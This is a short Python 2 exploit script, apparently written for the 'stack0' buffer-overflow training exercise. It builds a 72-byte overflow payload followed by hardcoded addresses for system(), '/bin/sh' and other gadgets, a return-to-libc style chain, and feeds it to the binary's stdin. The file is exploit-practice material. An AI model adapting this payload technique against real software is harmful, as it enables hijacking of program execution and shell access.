import struct
from pattern import *
PATTERN=pattern_gen(70)
system_address=struct.pack("<I", 0xb6f29bc4)
bin_sh=struct.pack("<I", 0xb6fc5304) 
print system_address
a=PATTERN+system_address+bin_sh
a='aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqbbb'+'rabc'+'sccc' #76
import subprocess
print '\npopen3:'
payload = 'A' * 72

#payload += struct.pack("<I", 0x76EE012C)
payload += struct.pack("<I", 0xb6f29bc4)
payload += struct.pack("<I", 0x7efff7f3)
payload += 'BBBB'
payload += struct.pack("<I", 0x76EC2BC8)
payload += 'CCCC'
payload += 'DDDD'
payload += 'EEEE'
payload += 'FFFF'
payload += struct.pack("<I", 0x76e9ffac)
print("[*] Sending Payload (!)")
proc = subprocess.Popen('./stack0',
                        shell=True,
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        )
print proc.stdout
#stdout_value, stderr_value = proc.communicate('through stdin to stdout')
stdout_value, stderr_value = proc.communicate(payload)
print '\tpass through:', repr(stdout_value)
print '\tstderr      :', repr(stderr_value)
